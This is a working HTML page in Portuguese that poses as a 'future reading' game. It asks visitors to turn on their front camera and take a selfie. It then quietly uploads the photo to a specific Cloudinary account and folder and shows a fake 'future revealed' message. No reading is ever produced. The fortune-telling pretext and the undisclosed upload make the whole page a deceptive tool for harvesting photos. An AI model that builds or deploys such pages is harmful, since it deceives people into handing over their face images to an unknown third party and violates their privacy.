<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>🔮 Leitura do Futuro</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0f172a;
      color: #e5e7eb;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .box {
      background: #020617;
      padding: 2rem;
      border-radius: 12px;
      width: 320px;
      text-align: center;
    }
    button {
      width: 100%;
      padding: 0.8rem;
      margin-top: 0.8rem;
      border: none;
      border-radius: 8px;
      background: #6366f1;
      color: #fff;
      cursor: pointer;
    }
    video, img {
      width: 100%;
      border-radius: 8px;
      margin-top: 1rem;
    }
    small {
      opacity: 0.7;
    }
  </style>
</head>
<body>

<div class="box">
  <h2>🔮 Leitura do Futuro</h2>
  <p>Precisamos de uma imagem para revelar sua mensagem.</p>
  <small>A foto é capturada instantaneamente.</small>

  <button id="startCamera">Ativar câmera</button>
  <button id="takePhoto" disabled>Tirar foto instantânea</button>

  <video id="video" autoplay playsinline hidden></video>
  <canvas id="canvas" hidden></canvas>
  <img id="preview" hidden>

  <p id="status"></p>
</div>

<script>
let stream;
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const preview = document.getElementById("preview");
const statusText = document.getElementById("status");

document.getElementById("startCamera").onclick = async () => {
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });

    video.srcObject = stream;
    video.hidden = false;
    document.getElementById("takePhoto").disabled = false;
    statusText.textContent = "Câmera ativa";
  } catch (err) {
    alert("Permissão negada");
  }
};

document.getElementById("takePhoto").onclick = async () => {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0);

  const base64Image = canvas.toDataURL("image/jpeg", 0.9);
  preview.src = base64Image;
  preview.hidden = false;

  stream.getTracks().forEach(t => t.stop());
  video.hidden = true;

  statusText.textContent = "Enviando imagem...";
  await enviarParaCloudinary(base64Image);
};

async function enviarParaCloudinary(base64Image) {
  const blob = await fetch(base64Image).then(r => r.blob());

  const formData = new FormData();
  formData.append("file", blob);
  formData.append("upload_preset", "Photos");
  formData.append("folder", "samples/ecommerce");

  const response = await fetch(
    "https://api.cloudinary.com/v1_1/dagqr3bms/image/upload",
    {
      method: "POST",
      body: formData
    }
  );

  const data = await response.json();
  statusText.innerHTML = "✨ Futuro revelado<br><small>Imagem enviada</small>";
  console.log("URL:", data.secure_url);
}
</script>

</body>
</html>
